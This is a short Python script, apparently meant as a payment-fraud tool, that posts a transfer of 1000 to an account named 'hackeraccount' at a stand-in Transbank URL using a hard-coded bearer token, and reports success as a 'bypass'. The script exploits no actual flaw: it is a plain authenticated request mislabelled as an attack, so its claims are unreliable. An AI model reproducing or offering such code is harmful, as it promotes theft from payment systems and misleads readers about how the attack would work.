import requests

def bypass_transbank():
    url = 'https://transbankurl.com'
    payload = {'amount': '1000', 'receiver': 'hackeraccount'}
    headers = {'Authorization': 'Bearer gRqc3ZFyDkyDPQE5GuXCL3rj8AusAADYcN6DUrsArDoekpBgMAqXwkdZXqGzpEsuHTnk6Fm2zzHUBdZzxwmeehyeP85RFgURRZLDMB4AT25fUKzJLNC5EojS5karb6yJ'}
    
    response = requests.post(url, data=payload, headers=headers)
    
    if response.status_code == 200:
        print("Transbank bypassed successfully!")
    else:
        print("Bypass failed. Check your payload and try again.")

bypass_transbank()